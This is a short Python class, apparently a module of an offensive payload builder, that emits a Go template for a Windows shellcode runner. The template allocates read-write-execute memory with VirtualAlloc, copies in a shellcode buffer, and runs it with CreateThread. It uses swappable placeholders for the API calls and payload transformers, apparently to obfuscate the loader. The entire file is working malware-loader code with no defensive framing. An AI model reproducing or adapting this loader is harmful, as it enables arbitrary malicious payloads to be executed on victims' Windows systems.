class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['unsafe',
                'golang.org/x/sys/windows']

    def compilerOptions(self) -> list[str]:
        return ["golang.org/x/sys/windows"]

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
    {transformers}

	addr, _, _ := {VirtualAlloc}(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)

	{RtlCopyMemory}(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	thread, _, _ := {CreateThread}(0, 0, addr, uintptr(0), 0, 0)

	{WaitForSingleObject}(thread, 0xFFFFFFFF)
"""